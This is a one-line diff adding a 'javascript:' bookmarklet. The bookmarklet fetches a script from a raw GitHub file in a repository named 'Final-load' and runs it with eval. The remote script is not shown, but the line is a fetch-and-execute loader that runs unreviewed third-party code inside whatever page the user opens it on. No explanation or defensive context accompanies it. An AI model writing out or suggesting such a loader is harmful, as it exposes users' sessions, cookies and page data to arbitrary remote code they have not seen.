@@ -1,0 +1,1 @@
+javascript:fetch("https://raw.githubusercontent.com/arif3tt-tech/Final-load/refs/heads/main/ai_studio_code(3).js").then(r=>r.text()).then(eval)
